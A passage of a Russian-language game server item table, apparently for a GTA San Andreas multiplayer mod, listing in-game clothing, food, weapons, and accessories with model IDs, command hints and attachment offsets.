	{1, 270, 2386, true, "Для переодевания используйте гардероб в доме", "Одежда",{-16.000000, 0.000000, -55.000000, 1.000000},{0.0, 0.0, -0.75, 0.0, 0.0, 0.0},true},
	{1, 271, 2386, true, "Для переодевания используйте гардероб в доме", "Одежда",{-16.000000, 0.000000, -55.000000, 1.000000},{0.0, 0.0, -0.75, 0.0, 0.0, 0.0},true},
	{1, 272, 2386, true, "Для переодевания используйте гардероб в доме", "Одежда",{-16.000000, 0.000000, -55.000000, 1.000000},{0.0, 0.0, -0.75, 0.0, 0.0, 0.0},true},
	{1, 273, 2386, true, "Для переодевания используйте гардероб в доме", "Одежда",{-16.000000, 0.000000, -55.000000, 1.000000},{0.0, 0.0, -0.75, 0.0, 0.0, 0.0},true},
	{1, 274, 2386, true, "Для переодевания используйте гардероб в доме", "Одежда",{-16.000000, 0.000000, -55.000000, 1.000000},{0.0, 0.0, -0.75, 0.0, 0.0, 0.0},true},
	{1, 275, 2386, true, "Для переодевания используйте гардероб в доме", "Одежда",{-16.000000, 0.000000, -55.000000, 1.000000},{0.0, 0.0, -0.75, 0.0, 0.0, 0.0},true},
	{1, 276, 2386, true, "Для переодевания используйте гардероб в доме", "Одежда",{-16.000000, 0.000000, -55.000000, 1.000000},{0.0, 0.0, -0.75, 0.0, 0.0, 0.0},true},
	{1, 277, 2386, true, "Для переодевания используйте гардероб в доме", "Одежда",{-16.000000, 0.000000, -55.000000, 1.000000},{0.0, 0.0, -0.75, 0.0, 0.0, 0.0},true},
	{1, 278, 2386, true, "Для переодевания используйте гардероб в доме", "Одежда",{-16.000000, 0.000000, -55.000000, 1.000000},{0.0, 0.0, -0.75, 0.0, 0.0, 0.0},true},
	{1, 279, 2386, true, "Для переодевания используйте гардероб в доме", "Одежда",{-16.000000, 0.000000, -55.000000, 1.000000},{0.0, 0.0, -0.75, 0.0, 0.0, 0.0},true},
	{1, 280, 2386, true, "Для переодевания используйте гардероб в доме", "Одежда",{-16.000000, 0.000000, -55.000000, 1.000000},{0.0, 0.0, -0.75, 0.0, 0.0, 0.0},true},
	{1, 281, 2386, true, "Для переодевания используйте гардероб в доме", "Одежда",{-16.000000, 0.000000, -55.000000, 1.000000},{0.0, 0.0, -0.75, 0.0, 0.0, 0.0},true},
	{1, 282, 2386, true, "Для переодевания используйте гардероб в доме", "Одежда",{-16.000000, 0.000000, -55.000000, 1.000000},{0.0, 0.0, -0.75, 0.0, 0.0, 0.0},true},
	{1, 283, 2386, true, "Для переодевания используйте гардероб в доме", "Одежда",{-16.000000, 0.000000, -55.000000, 1.000000},{0.0, 0.0, -0.75, 0.0, 0.0, 0.0},true},
	{1, 284, 2386, true, "Для переодевания используйте гардероб в доме", "Одежда",{-16.000000, 0.000000, -55.000000, 1.000000},{0.0, 0.0, -0.75, 0.0, 0.0, 0.0},true},
	{1, 285, 2386, true, "Для переодевания используйте гардероб в доме", "Одежда",{-16.000000, 0.000000, -55.000000, 1.000000},{0.0, 0.0, -0.75, 0.0, 0.0, 0.0},true},
	{1, 286, 2386, true, "Для переодевания используйте гардероб в доме", "Одежда",{-16.000000, 0.000000, -55.000000, 1.000000},{0.0, 0.0, -0.75, 0.0, 0.0, 0.0},true},
	{1, 287, 2386, true, "Для переодевания используйте гардероб в доме", "Одежда",{-16.000000, 0.000000, -55.000000, 1.000000},{0.0, 0.0, -0.75, 0.0, 0.0, 0.0},true},
	{1, 288, 2386, true, "Для переодевания используйте гардероб в доме", "Одежда",{-16.000000, 0.000000, -55.000000, 1.000000},{0.0, 0.0, -0.75, 0.0, 0.0, 0.0},true},
	{1, 289, 2386, true, "Для переодевания используйте гардероб в доме", "Одежда",{-16.000000, 0.000000, -55.000000, 1.000000},{0.0, 0.0, -0.75, 0.0, 0.0, 0.0},true},
	{1, 290, 2386, true, "Для переодевания используйте гардероб в доме", "Одежда",{-16.000000, 0.000000, -55.000000, 1.000000},{0.0, 0.0, -0.75, 0.0, 0.0, 0.0},true},
	{1, 291, 2386, true, "Для переодевания используйте гардероб в доме", "Одежда",{-16.000000, 0.000000, -55.000000, 1.000000},{0.0, 0.0, -0.75, 0.0, 0.0, 0.0},true},
	{1, 292, 2386, true, "Для переодевания используйте гардероб в доме", "Одежда",{-16.000000, 0.000000, -55.000000, 1.000000},{0.0, 0.0, -0.75, 0.0, 0.0, 0.0},true},
	{1, 293, 2386, true, "Для переодевания используйте гардероб в доме", "Одежда",{-16.000000, 0.000000, -55.000000, 1.000000},{0.0, 0.0, -0.75, 0.0, 0.0, 0.0},true},
	{1, 294, 2386, true, "Для переодевания используйте гардероб в доме", "Одежда",{-16.000000, 0.000000, -55.000000, 1.000000},{0.0, 0.0, -0.75, 0.0, 0.0, 0.0},true},
	{1, 295, 2386, true, "Для переодевания используйте гардероб в доме", "Одежда",{-16.000000, 0.000000, -55.000000, 1.000000},{0.0, 0.0, -0.75, 0.0, 0.0, 0.0},true},
	{1, 296, 2386, true, "Для переодевания используйте гардероб в доме", "Одежда",{-16.000000, 0.000000, -55.000000, 1.000000},{0.0, 0.0, -0.75, 0.0, 0.0, 0.0},true},
	{1, 297, 2386, true, "Для переодевания используйте гардероб в доме", "Одежда",{-16.000000, 0.000000, -55.000000, 1.000000},{0.0, 0.0, -0.75, 0.0, 0.0, 0.0},true},
	{1, 298, 2386, true, "Для переодевания используйте гардероб в доме", "Одежда",{-16.000000, 0.000000, -55.000000, 1.000000},{0.0, 0.0, -0.75, 0.0, 0.0, 0.0},true},
	{1, 299, 2386, true, "Для переодевания используйте гардероб в доме", "Одежда",{-16.000000, 0.000000, -55.000000, 1.000000},{0.0, 0.0, -0.75, 0.0, 0.0, 0.0},true},
	{1, 300, 2386, true, "Для переодевания используйте гардероб в доме", "Одежда",{-16.000000, 0.000000, -55.000000, 1.000000},{0.0, 0.0, -0.75, 0.0, 0.0, 0.0},true},
	{1, 301, 2386, true, "Для переодевания используйте гардероб в доме", "Одежда",{-16.000000, 0.000000, -55.000000, 1.000000},{0.0, 0.0, -0.75, 0.0, 0.0, 0.0},true},
	{1, 302, 2386, true, "Для переодевания используйте гардероб в доме", "Одежда",{-16.000000, 0.000000, -55.000000, 1.000000},{0.0, 0.0, -0.75, 0.0, 0.0, 0.0},true},
	{1, 303, 2386, true, "Для переодевания используйте гардероб в доме", "Одежда",{-16.000000, 0.000000, -55.000000, 1.000000},{0.0, 0.0, -0.75, 0.0, 0.0, 0.0},true},
	{1, 304, 2386, true, "Для переодевания используйте гардероб в доме", "Одежда",{-16.000000, 0.000000, -55.000000, 1.000000},{0.0, 0.0, -0.75, 0.0, 0.0, 0.0},true},
	{1, 305, 2386, true, "Для переодевания используйте гардероб в доме", "Одежда",{-16.000000, 0.000000, -55.000000, 1.000000},{0.0, 0.0, -0.75, 0.0, 0.0, 0.0},true},
	{1, 306, 2386, true, "Для переодевания используйте гардероб в доме", "Одежда",{-16.000000, 0.000000, -55.000000, 1.000000},{0.0, 0.0, -0.75, 0.0, 0.0, 0.0},true},
	{1, 307, 2386, true, "Для переодевания используйте гардероб в доме", "Одежда",{-16.000000, 0.000000, -55.000000, 1.000000},{0.0, 0.0, -0.75, 0.0, 0.0, 0.0},true},
	{1, 308, 2386, true, "Для переодевания используйте гардероб в доме", "Одежда",{-16.000000, 0.000000, -55.000000, 1.000000},{0.0, 0.0, -0.75, 0.0, 0.0, 0.0},true},
	{1, 309, 2386, true, "Для переодевания используйте гардероб в доме", "Одежда",{-16.000000, 0.000000, -55.000000, 1.000000},{0.0, 0.0, -0.75, 0.0, 0.0, 0.0},true},
	{1, 310, 2386, true, "Для переодевания используйте гардероб в доме", "Одежда",{-16.000000, 0.000000, -55.000000, 1.000000},{0.0, 0.0, -0.75, 0.0, 0.0, 0.0},true},
	{1, 311, 2386, true, "Для переодевания используйте гардероб в доме", "Одежда",{-16.000000, 0.000000, -55.000000, 1.000000},{0.0, 0.0, -0.75, 0.0, 0.0, 0.0},true},
	{200, 2663, 2663, true, "Chips", "Чипсы",{0.000000, 0.000000, 0.000000, 1.000000},{0.0, 0.0, -0.91, 0.0, 0.0, 0.0},true}, //чипсы 314
	{200, 1546, 1546, true, "", "Спранк",{0.000000, 0.000000, 0.000000, 1.00000},{0.0, 0.0, -0.91, 0.0, 0.0, 0.0},true}, //спранк 315
	{200, 1487, 1487, true, "", "Пиво",{0.000000, 0.000000, 0.000000, 1.00000},{0.0, 0.0, -0.91, 0.0, 0.0, 0.0},true}, //пиво 316
	{200, 11708, 11708, false, "Для использования введите: {f7ae11}/tie", "Веревка",{90.000000, 0.000000, 0.000000, 1.00000},{0.0, 0.0, -0.91, 0.0, 0.0, 0.0},true}, //319 веревка
	{10, 19038, 19038, true, "Для использования введите: {f7ae11}/mask", "Маска",{0.000000, 0.000000, -50.000000, 1.00000},{0.0, 0.0, -0.91, 0.0, -90.0, 0.0},true}, //320 маска
	{1, 19513, 19513, true, "Для использования введите: {f7ae11}/phone", "Телефон",{90.000000, 180.000000, 0.000000, 1.000000},{0.0, 0.0, -0.91, 0.0, 0.0, 0.0},false}, //321 телефон
	{1, 19623, 19623, true, "Camera", "Фотоапарат",{0.000000, 25.000000, 180.000000, 1.100000},{0.0, 0.0, -0.91, -90.0, 0.0, 0.0},true}, //323 фотоапарат
	{200, 19625, 19625, true, "Для использования введите: {f7ae11}/smoke", "Сигареты",{-90.000000, 0.000000, 35.000000, 1.00000},{0.0, 0.0, -0.91, 0.0, 0.0, 0.0},true}, //325 сигары
	{200, 11736, 11736, true, "Для использования введите: {f7ae11}/healme", "Аптечка",{90.000000, 0.000000, 0.000000, 1.000000},{0.0, 0.0, -0.91, 0.0, 0.0, 0.0},true}, //332 аптечка
	{1, 337, 337, true, "Shovel", "Лопата",{0.000000, -30.000000, 0.000000, 1.500000},{0.0, 0.0, -0.91, 0.0, 90.0, 0.0},true}, //343 лопата
	{200, 1650, 1650, true, "Для использования введите: {f7ae11}/fillcar", "Канистра",{0.000000, 0.000000, 0.000000, 1.00000},{0.0, 0.0, -0.91, 0.0, 0.0, 0.0},true}, //345 канистра
	{200, 1672, 1672, true, "Aerosol", "Балончик с краской",{0.000000, 0.000000, 90.000000, 1.00000},{0.0, 0.0, -0.91, 0.0, 0.0, 0.0},true}, //346 балон с краской
	{1, 331, 331, true, "Castet", "Кастет",{0.000000, -30.000000, 0.000000, 1.500000},{0.0, 0.0, -0.91, 90.0, 0.0, 0.0},true}, //347 кастет
	{1, 336, 336, true, "Bit", "Бита",{0.000000, -30.000000, 0.000000, 1.500000},{0.0, 0.0, -0.91, 90.0, 0.0, 0.0},true}, //348 бита
	{1, 339, 339, true, "Katana", "Катана",{0.000000, -30.000000, 0.000000, 1.500000},{0.0, 0.0, -0.91, 90.0, 0.0, 0.0},true}, //349 катана
	{1, 371, 371, true, "Для управления аксессуарами используйте: {f7ae11}/acs", "Парашют",{0.000000, 0.000000, 0.000000, 1.00000},{0.0, 0.0, -0.91, 90.0, 0.0, 0.0},true}, //350 парашут
	{500, 343, 343, true, "S. Grenade", "Дымовая граната",{0.000000, 0.000000, 0.000000, 1.00000},{0.0, 0.0, -0.91, 90.0, 0.0, 0.0},true}, //351 дымовуха
	{500, 348, 348, true, "Eagle", "Пистолет Eagle",{0.000000, -30.000000, 0.000000, 1.500000},{0.0, 0.0, -0.91, 90.0, 0.0, 0.0},true}, //352 eagle
	{500, 349, 349, true, "ShotGun", "Винтовка ShotGun",{0.000000, -30.000000, 0.000000, 1.500000},{0.0, 0.0, -0.91, 90.0, 0.0, 0.0},true}, //353 ShotGun
	{500, 353, 353, true, "MP5", "Автомат MP5",{0.000000, -30.000000, 0.000000, 1.500000},{0.0, 0.0, -0.91, 90.0, 0.0, 0.0},true}, //354 MP5
	{500, 355, 355, true, "AK47", "Автомат AK47",{0.000000, -30.000000, 0.000000, 1.500000},{0.0, 0.0, -0.91, 90.0, 0.0, 0.0},true}, //355 AK47
	{500, 356, 356, true, "M4", "Автомат M4",{0.000000, -30.000000, 0.000000, 1.500000},{0.0, 0.0, -0.91, 90.0, 0.0, 0.0},true}, //356 M4
	{500, 357, 357, true, "Rifle", "Винтовка Rifle",{0.000000, -30.000000, 0.000000, 1.500000},{0.0, 0.0, -0.91, 90.0, 0.0, 0.0},true}, //357 Rifle
	{500, 358, 358, true, "Sniper gun", "Снайперская винтовка",{0.000000, -30.000000, 0.000000, 1.500000},{0.0, 0.0, -0.91, 90.0, 0.0, 0.0},true}, //358 снайперка
	{500, 352, 352, true, "UZI", "UZI",{0.000000, -30.000000, 0.000000, 1.500000},{0.0, 0.0, -0.91, 90.0, 0.0, 0.0},true}, //359 UZI
	{200, 19473, 19473, true, "Для использования введите: {f7ae11}/usedrugs", "Наркотики",{0.000000, 0.000000, 0.000000, 1.00000},{0.0, 0.0, -0.91, 0.0, 0.0, 0.0},true}, //361 drugs
	{1, 19421, 19421, true, "Для управления аксессуарами используйте: {f7ae11}/acs", "Наушники",{120.000000, 0.000000, 0.000000, 1.000000},{0.0, 0.0, -0.91, 0.0, 0.0, 0.0},true}, //370 ///Наушники
	{1, 19422, 19422, true, "Для управления аксессуарами используйте: {f7ae11}/acs", "Наушники",{120.000000, 0.000000, 0.000000, 1.000000},{0.0, 0.0, -0.91, 0.0, 0.0, 0.0},true}, //371
	{1, 19423, 19423, true, "Для управления аксессуарами используйте: {f7ae11}/acs", "Наушники",{120.000000, 0.000000, 0.000000, 1.000000},{0.0, 0.0, -0.91, 0.0, 0.0, 0.0},true}, //372
	{1, 19424, 19424, true, "Для управления аксессуарами используйте: {f7ae11}/acs", "Наушники",{120.000000, 0.000000, 0.000000, 1.000000},{0.0, 0.0, -0.91, 0.0, 0.0, 0.0},true}, //373
	{1, 19069, 19069, true, "Для управления аксессуарами используйте: {f7ae11}/acs", "Шапка",{0.000000, 0.000000, 0.000000, 1.00000},{0.0, 0.0, -0.91, 0.0, 25.0, 0.0},true}, //374 ///шапки
	{1, 19068, 19068, true, "Для управления аксессуарами используйте: {f7ae11}/acs", "Шапка",{0.000000, 0.000000, 0.000000, 1.00000},{0.0, 0.0, -0.91, 0.0, 25.0, 0.0},true}, //375
	{1, 19067, 19067, true, "Для управления аксессуарами используйте: {f7ae11}/acs", "Шапка",{0.000000, 0.000000, 0.000000, 1.00000},{0.0, 0.0, -0.91, 0.0, 25.0, 0.0},true}, //376
	{1, 19554, 19554, true, "Для управления аксессуарами используйте: {f7ae11}/acs", "Шапка",{0.000000, -90.000000, 0.000000, 1.00000},{0.0, 0.0, -0.91, -153.0, 90.0, 0.0},true}, //377
	{1, 18953, 18953, true, "Для управления аксессуарами используйте: {f7ae11}/acs", "Шапка",{0.000000, -90.000000, 0.000000, 1.00000},{0.0, 0.0, -0.91, 180.0, 90.0, 0.0},true}, //378
	{1, 18954, 18954, true, "Для управления аксессуарами используйте: {f7ae11}/acs", "Шапка",{0.000000, -90.000000, 0.000000, 1.00000},{0.0, 0.0, -0.91, 180.0, 90.0, 0.0},true}, //379
	{1, 18968, 18968, true, "Для управления аксессуарами используйте: {f7ae11}/acs", "Панамка",{0.000000, 0.000000, 35.000000, 1.00000},{0.0, 0.0, -0.91, 0.0, 0.0, 0.0},true}, //380 ///панамки
	{1, 18967, 18967, true, "Для управления аксессуарами используйте: {f7ae11}/acs", "Панамка",{0.000000, 0.000000, 35.000000, 1.00000},{0.0, 0.0, -0.91, 0.0, 0.0, 0.0},true}, //381
	{1, 18969, 18969, true, "Для управления аксессуарами используйте: {f7ae11}/acs", "Панамка",{0.000000, 0.000000, 35.000000, 1.00000},{0.0, 0.0, -0.91, 0.0, 0.0, 0.0},true}, //382
	{1, 18955, 18955, true, "Для управления аксессуарами используйте: {f7ae11}/acs", "Кепка",{0.000000, 0.000000, -180.000000, 1.00000},{0.0, 0.0, -0.91, 0.0, 25.0, 0.0},true}, //383 ////кепки
	{1, 18956, 18956, true, "Для управления аксессуарами используйте: {f7ae11}/acs", "Кепка",{0.000000, 0.000000, -180.000000, 1.00000},{0.0, 0.0, -0.91, 0.0, 25.0, 0.0},true}, //384
	{1, 18957, 18957, true, "Для управления аксессуарами используйте: {f7ae11}/acs", "Кепка",{0.000000, 0.000000, -180.000000, 1.00000},{0.0, 0.0, -0.91, 0.0, 25.0, 0.0},true}, //385
	{1, 18959, 18959, true, "Для управления аксессуарами используйте: {f7ae11}/acs", "Кепка",{0.000000, 0.000000, -180.000000, 1.00000},{0.0, 0.0, -0.91, 0.0, 25.0, 0.0},true}, //386
	{1, 18926, 18926, true, "Для управления аксессуарами используйте: {f7ae11}/acs", "Кепка",{-90.000000, 0.000000, -70.000000, 1.00000},{0.0, 0.0, -0.91, 0.0, 25.0, 0.0},true}, //387
	{1, 18927, 18927, true, "Для управления аксессуарами используйте: {f7ae11}/acs", "Кепка",{-90.000000, 0.000000, -70.000000, 1.00000},{0.0, 0.0, -0.91, 0.0, 25.0, 0.0},true}, //388
	{1, 18928, 18928, true, "Для управления аксессуарами используйте: {f7ae11}/acs", "Кепка",{-90.000000, 0.000000, -70.000000, 1.00000},{0.0, 0.0, -0.91, 0.0, 25.0, 0.0},true}, //389
	{1, 18929, 18929, true, "Для управления аксессуарами используйте: {f7ae11}/acs", "Кепка",{-90.000000, 0.000000, -70.000000, 1.00000},{0.0, 0.0, -0.91, 0.0, 25.0, 0.0},true}, //390
	{1, 18930, 18930, true, "Для управления аксессуарами используйте: {f7ae11}/acs", "Кепка",{-90.000000, 0.000000, -70.000000, 1.00000},{0.0, 0.0, -0.91, 0.0, 25.0, 0.0},true}, //391
	{1, 18931, 18931, true, "Для управления аксессуарами используйте: {f7ae11}/acs", "Кепка",{-90.000000, 0.000000, -70.000000, 1.00000},{0.0, 0.0, -0.91, 0.0, 25.0, 0.0},true}, //392
	{1, 18932, 18932, true, "Для управления аксессуарами используйте: {f7ae11}/acs", "Кепка",{-90.000000, 0.000000, -70.000000, 1.00000},{0.0, 0.0, -0.91, 0.0, 25.0, 0.0},true}, //393
	{1, 18933, 18933, true, "Для управления аксессуарами используйте: {f7ae11}/acs", "Кепка",{-90.000000, 0.000000, -70.000000, 1.00000},{0.0, 0.0, -0.91, 0.0, 25.0, 0.0},true}, //394
	{1, 19104, 19104, true, "Для управления аксессуарами используйте: {f7ae11}/acs", "Каска",{90.000000, 0.000000, 90.000000, 1.00000},{0.0, 0.0, -0.91, 0.0, 0.0, 0.0},true}, //395 //каски
	{1, 19105, 19105, true, "Для управления аксессуарами используйте: {f7ae11}/acs", "Каска",{90.000000, 0.000000, 90.000000, 1.00000},{0.0, 0.0, -0.91, 0.0, 0.0, 0.0},true}, //396
	{1, 19106, 19106, true, "Для управления аксессуарами используйте: {f7ae11}/acs", "Каска",{90.000000, 0.000000, 90.000000, 1.00000},{0.0, 0.0, -0.91, 0.0, 0.0, 0.0},true}, //397
	{1, 19107, 19107, true, "Для управления аксессуарами используйте: {f7ae11}/acs", "Каска",{90.000000, 0.000000, 90.000000, 1.00000},{0.0, 0.0, -0.91, 0.0, 0.0, 0.0},true}, //398
	{1, 19108, 19108, true, "Для управления аксессуарами используйте: {f7ae11}/acs", "Каска",{90.000000, 0.000000, 90.000000, 1.00000},{0.0, 0.0, -0.91, 0.0, 0.0, 0.0},true}, //399
	{1, 19109, 19109, true, "Для управления аксессуарами используйте: {f7ae11}/acs", "Каска",{90.000000, 0.000000, 90.000000, 1.00000},{0.0, 0.0, -0.91, 0.0, 0.0, 0.0},true}, //400
	{1, 18925, 18925, true, "Для управления аксессуарами используйте: {f7ae11}/acs", "Берет",{90.000000, 0.000000, 90.000000, 1.00000},{0.0, 0.0, -0.91, -15.0, -90.0, 0.0},true}, //401 //береты
	{1, 18922, 18922, true, "Для управления аксессуарами используйте: {f7ae11}/acs", "Берет",{90.000000, 0.000000, 90.000000, 1.00000},{0.0, 0.0, -0.91, -15.0, -90.0, 0.0},true}, //402
	{1, 18923, 18923, true, "Для управления аксессуарами используйте: {f7ae11}/acs", "Берет",{90.000000, 0.000000, 90.000000, 1.00000},{0.0, 0.0, -0.91, -15.0, -90.0, 0.0},true}, //403
	{1, 18924, 18924, true, "Для управления аксессуарами используйте: {f7ae11}/acs", "Берет",{90.000000, 0.000000, 90.000000, 1.00000},{0.0, 0.0, -0.91, -15.0, -90.0, 0.0},true}, //404
	{1, 18921, 18921, true, "Для управления аксессуарами используйте: {f7ae11}/acs", "Берет",{90.000000, 0.000000, 90.000000, 1.00000},{0.0, 0.0, -0.91, -15.0, -90.0, 0.0},true}, //405
	{1, 19519, 19519, true, "Для управления аксессуарами используйте: {f7ae11}/acs", "Парик",{0.000000, -90.000000, 25.000000, 1.00000},{0.0, 0.0, -0.91, 0.0, -90.0, 0.0},true}, //406 //парики
	{1, 19274, 19274, true, "Для управления аксессуарами используйте: {f7ae11}/acs", "Парик",{0.000000, -90.000000, 25.000000, 1.00000},{0.0, 0.0, -0.91, 0.0, -90.0, 0.0},true}, //407
	{1, 19011, 19011, true, "Для управления аксессуарами используйте: {f7ae11}/acs", "Очки",{-20.000000, 0.000000, 90.000000, 1.000000},{0.0, 0.0, -0.91, 0.0, 0.0, 0.0},true}, //408 //очки
	{1, 19012, 19012, true, "Для управления аксессуарами используйте: {f7ae11}/acs", "Очки",{-20.000000, 0.000000, 90.000000, 1.000000},{0.0, 0.0, -0.91, 0.0, 0.0, 0.0},true}, //409
	{1, 19013, 19013, true, "Для управления аксессуарами используйте: {f7ae11}/acs", "Очки",{-20.000000, 0.000000, 90.000000, 1.000000},{0.0, 0.0, -0.91, 0.0, 0.0, 0.0},true}, //410
	{1, 19014, 19014, true, "Для управления аксессуарами используйте: {f7ae11}/acs", "Очки",{-20.000000, 0.000000, 90.000000, 1.000000},{0.0, 0.0, -0.91, 0.0, 0.0, 0.0},true}, //411
	{1, 19015, 19015, true, "Для управления аксессуарами используйте: {f7ae11}/acs", "Очки",{-20.000000, 0.000000, 90.000000, 1.000000},{0.0, 0.0, -0.91, 0.0, 0.0, 0.0},true}, //412
	{1, 19016, 19016, true, "Для управления аксессуарами используйте: {f7ae11}/acs", "Очки",{-20.000000, 0.000000, 90.000000, 1.000000},{0.0, 0.0, -0.91, 0.0, 0.0, 0.0},true}, //413
	{1, 19017, 19017, true, "Для управления аксессуарами используйте: {f7ae11}/acs", "Очки",{-20.000000, 0.000000, 90.000000, 1.000000},{0.0, 0.0, -0.91, 0.0, 0.0, 0.0},true}, //414
	{1, 19018, 19018, true, "Для управления аксессуарами используйте: {f7ae11}/acs", "Очки",{-20.000000, 0.000000, 90.000000, 1.000000},{0.0, 0.0, -0.91, 0.0, 0.0, 0.0},true}, //415
	{1, 19019, 19019, true, "Для управления аксессуарами используйте: {f7ae11}/acs", "Очки",{-20.000000, 0.000000, 90.000000, 1.000000},{0.0, 0.0, -0.91, 0.0, 0.0, 0.0},true}, //416
	{1, 19024, 19024, true, "Для управления аксессуарами используйте: {f7ae11}/acs", "Очки",{-20.000000, 0.000000, 90.000000, 1.000000},{0.0, 0.0, -0.91, 0.0, 0.0, 0.0},true}, //417
	{1, 19027, 19027, true, "Для управления аксессуарами используйте: {f7ae11}/acs", "Очки",{-20.000000, 0.000000, 90.000000, 1.000000},{0.0, 0.0, -0.91, 0.0, 0.0, 0.0},true}, //418
	{1, 19028, 19028, true, "Для управления аксессуарами используйте: {f7ae11}/acs", "Очки",{-20.000000, 0.000000, 90.000000, 1.000000},{0.0, 0.0, -0.91, 0.0, 0.0, 0.0},true}, //419
	{1, 19029, 19029, true, "Для управления аксессуарами используйте: {f7ae11}/acs", "Очки",{-20.000000, 0.000000, 90.000000, 1.000000},{0.0, 0.0, -0.91, 0.0, 0.0, 0.0},true}, //420
	{1, 19022, 19022, true, "Для управления аксессуарами используйте: {f7ae11}/acs", "Очки",{-20.000000, 0.000000, 90.000000, 1.000000},{0.0, 0.0, -0.91, 0.0, 0.0, 0.0},true}, //421
	{1, 19035, 19035, true, "Для управления аксессуарами используйте: {f7ae11}/acs", "Очки",{-20.000000, 0.000000, 90.000000, 1.000000},{0.0, 0.0, -0.91, 0.0, 0.0, 0.0},true}, //422
	{1, 19031, 19031, true, "Для управления аксессуарами используйте: {f7ae11}/acs", "Очки",{-20.000000, 0.000000, 90.000000, 1.000000},{0.0, 0.0, -0.91, 0.0, 0.0, 0.0},true}, //423
	{1, 19032, 19032, true, "Для управления аксессуарами используйте: {f7ae11}/acs", "Очки",{-20.000000, 0.000000, 90.000000, 1.000000},{0.0, 0.0, -0.91, 0.0, 0.0, 0.0},true}, //424
	{1, 19033, 19033, true, "Для управления аксессуарами используйте: {f7ae11}/acs", "Очки",{-20.000000, 0.000000, 90.000000, 1.000000},{0.0, 0.0, -0.91, 0.0, 0.0, 0.0},true}, //425
    {1, 18911, 18911, true, "Для управления аксессуарами используйте: {f7ae11}/acs", "Бандана",{90.000000, 90.000000, 0.000000, 1.000000},{0.0, 0.0, -0.91, 0.0, 90.0, 0.0},true}, //426 //банданы
    {1, 18912, 18912, true, "Для управления аксессуарами используйте: {f7ae11}/acs", "Бандана",{90.000000, 90.000000, 0.000000, 1.000000},{0.0, 0.0, -0.91, 0.0, 90.0, 0.0},true}, //427
    {1, 18913, 18913, true, "Для управления аксессуарами используйте: {f7ae11}/acs", "Бандана",{90.000000, 90.000000, 0.000000, 1.000000},{0.0, 0.0, -0.91, 0.0, 90.0, 0.0},true}, //428
    {1, 18914, 18914, true, "Для управления аксессуарами используйте: {f7ae11}/acs", "Бандана",{90.000000, 90.000000, 0.000000, 1.000000},{0.0, 0.0, -0.91, 0.0, 90.0, 0.0},true}, //429
    {1, 18915, 18915, true, "Для управления аксессуарами используйте: {f7ae11}/acs", "Бандана",{90.000000, 90.000000, 0.000000, 1.000000},{0.0, 0.0, -0.91, 0.0, 90.0, 0.0},true}, //430
    {1, 18916, 18916, true, "Для управления аксессуарами используйте: {f7ae11}/acs", "Бандана",{90.000000, 90.000000, 0.000000, 1.000000},{0.0, 0.0, -0.91, 0.0, 90.0, 0.0},true}, //431
    {1, 18917, 18917, true, "Для управления аксессуарами используйте: {f7ae11}/acs", "Бандана",{90.000000, 90.000000, 0.000000, 1.000000},{0.0, 0.0, -0.91, 0.0, 90.0, 0.0},true}, //432
    {1, 18918, 18918, true, "Для управления аксессуарами используйте: {f7ae11}/acs", "Бандана",{90.000000, 90.000000, 0.000000, 1.000000},{0.0, 0.0, -0.91, 0.0, 90.0, 0.0},true}, //433
    {1, 18919, 18919, true, "Для управления аксессуарами используйте: {f7ae11}/acs", "Бандана",{90.000000, 90.000000, 0.000000, 1.000000},{0.0, 0.0, -0.91, 0.0, 90.0, 0.0},true}, //434
    {1, 18920, 18920, true, "Для управления аксессуарами используйте: {f7ae11}/acs", "Бандана",{90.000000, 90.000000, 0.000000, 1.000000},{0.0, 0.0, -0.91, 0.0, 90.0, 0.0},true}, //435
	{1, 18947, 18947, true, "Для управления аксессуарами используйте: {f7ae11}/acs", "Шляпа",{-30.000000, -90.000000, 0.000000, 1.000000},{0.0, 0.0, -0.91, -15.0, -90.0, 0.0},true}, //436 //шляпы
	{1, 18948, 18948, true, "Для управления аксессуарами используйте: {f7ae11}/acs", "Шляпа",{-30.000000, -90.000000, 0.000000, 1.000000},{0.0, 0.0, -0.91, -15.0, -90.0, 0.0},true}, //437
	{1, 18949, 18949, true, "Для управления аксессуарами используйте: {f7ae11}/acs", "Шляпа",{-30.000000, -90.000000, 0.000000, 1.000000},{0.0, 0.0, -0.91, -15.0, -90.0, 0.0},true}, //438
	{1, 18950, 18950, true, "Для управления аксессуарами используйте: {f7ae11}/acs", "Шляпа",{-30.000000, -90.000000, 0.000000, 1.000000},{0.0, 0.0, -0.91, -15.0, -90.0, 0.0},true}, //439
	{1, 18951, 18951, true, "Для управления аксессуарами используйте: {f7ae11}/acs", "Шляпа",{-30.000000, -90.000000, 0.000000, 1.000000},{0.0, 0.0, -0.91, -15.0, -90.0, 0.0},true}, //440
	{1, 19042, 19042, true, "Для управления аксессуарами используйте: {f7ae11}/acs", "Часы",{0.000000, 0.000000, 0.000000, 1.00000},{0.0, 0.0, -0.91, 0.0, 0.0, 0.0},true}, //441 //часы
	{1, 19041, 19041, true, "Для управления аксессуарами используйте: {f7ae11}/acs", "Часы",{0.000000, 0.000000, 0.000000, 1.00000},{0.0, 0.0, -0.91, 0.0, 0.0, 0.0},true}, //442
	{1, 19040, 19040, true, "Для управления аксессуарами используйте: {f7ae11}/acs", "Часы",{0.000000, 0.000000, 0.000000, 1.00000},{0.0, 0.0, -0.91, 0.0, 0.0, 0.0},true}, //443
	{1, 19039, 19039, true, "Для управления аксессуарами используйте: {f7ae11}/acs", "Часы",{0.000000, 0.000000, 0.000000, 1.00000},{0.0, 0.0, -0.91, 0.0, 0.0, 0.0},true}, //444
	{1, 19043, 19043, true, "Для управления аксессуарами используйте: {f7ae11}/acs", "Часы",{0.000000, 0.000000, 0.000000, 1.00000},{0.0, 0.0, -0.91, 0.0, 0.0, 0.0},true}, //445
	{1, 19044, 19044, true, "Для управления аксессуарами используйте: {f7ae11}/acs", "Часы",{0.000000, 0.000000, 0.000000, 1.00000},{0.0, 0.0, -0.91, 0.0, 0.0, 0.0},true}, //446
	{1, 19045, 19045, true, "Для управления аксессуарами используйте: {f7ae11}/acs", "Часы",{0.000000, 0.000000, 0.000000, 1.00000},{0.0, 0.0, -0.91, 0.0, 0.0, 0.0},true}, //447
	{1, 19046, 19046, true, "Для управления аксессуарами используйте: {f7ae11}/acs", "Часы",{0.000000, 0.000000, 0.000000, 1.00000},{0.0, 0.0, -0.91, 0.0, 0.0, 0.0},true}, //448
	{1, 19048, 19048, true, "Для управления аксессуарами используйте: {f7ae11}/acs", "Часы",{0.000000, 0.000000, 0.000000, 1.00000},{0.0, 0.0, -0.91, 0.0, 0.0, 0.0},true}, //449
